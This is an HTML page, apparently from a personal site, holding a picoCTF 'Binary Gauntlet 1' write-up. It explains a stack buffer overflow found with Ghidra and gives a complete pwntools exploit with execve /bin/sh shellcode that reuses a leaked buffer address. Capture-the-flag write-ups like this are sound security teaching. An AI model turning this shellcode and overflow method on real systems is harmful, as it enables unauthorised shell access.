@@ -1,0 +1,93 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>Binary Gauntlet 1 Writeup</h1>
+        </div>
+    </div>
+</div>
+<div class="paragraph">
+	<H4>Problem</H4>
+    <p>
+		<br><br>
+    	Okay, time for a challenge. <a href=../docs/pico/gauntlet_1>gauntlet</a> nc mercury.picoctf.net 19968
+    	<br>
+    </p>
+</div>
+<div class="paragraph">
+	<H4>Solution</H4>
+    <p>
+    	<br><br>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to and retrieve the flag from using the developed exploit.
+    	<br><br>
+    	I started off by using Ghidra to look at the disassembly of the given binary. It is fairly straightforward. There is only 1 function. It prints out the address of a local buffer, and then
+    	reads in 1000 bytes from the user. This user input is then printed out, and another 1000 bytes are read in from the user. This user input is then copied into the local buffer from earlier. 
+		Since the local buffer has a size of 104 bytes, and up to 1000 bytes are read in from the user, this can be used to cause a buffer overflow. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    	<img src="../imgs/pico/chall2_1.png" alt="">
+</div>
+
+<div class="paragraph">
+    <p>
+    	<br><br>
+    	Now that we know the vulnerability, its time to exploit it. We run checksec on the binary to look at the enabled protections. It seems like there are none. However since we need to run the exploit remotely, chances are that aslr is enabled, so we will have to account for that. 
+    	<br><br>
+    </p>
+</div>
+<div>
+    	<img src="../imgs/pico/chall2_2.png" alt="">
+</div>
+
+<div class="paragraph">
+	<p>
+		<br><br>
+		Using a cyclic pattern, we find that the offset needed to overwrite the return address is 120 bytes. Since the address of the buffer is initially leaked out, we can use that to determine the location that we want to return too. We add our shellcode to spawn a /bin/sh shell, and the exploit is complete. The full exploit is posted below. 
+		<br><br>
+	</p>	
+</div>
+<div>
+    <style 
+    	type="text/css">
+    		pre code {
+					  background-color: #008080;
+					  border: 1px solid #999;
+					  display: block;
+					  padding: 15px;
+					  color:  #F5F5DC;
+					}
+    </style>
+    <pre>
+  		<code>
+#!/usr/bin/env python
+from pwn import *
+
+p = remote('mercury.picoctf.net', 19968)
+
+payload = b"\x31\xF6\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x48\x89\xE7\x6A\x3B\x58\x0F\x05"
+payload = payload.ljust(120,b'A')
+
+data = p.clean().decode('latin-1')
+leak = int(data,16)
+payload += p64(leak)
+
+p.sendline('a')
+p.clean()
+p.sendline(payload)
+p.interactive()
+  		</code>
+	</pre>
+</div>
+<div>
+	<p>
+		<br>
+		After running the exploit, we spawn a shell and can read the flag.
+		<br><br>
+	</p>
+
+</div>
+<div>
+	<img src="../imgs/pico/chall2_3.png" alt="">
+</div>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
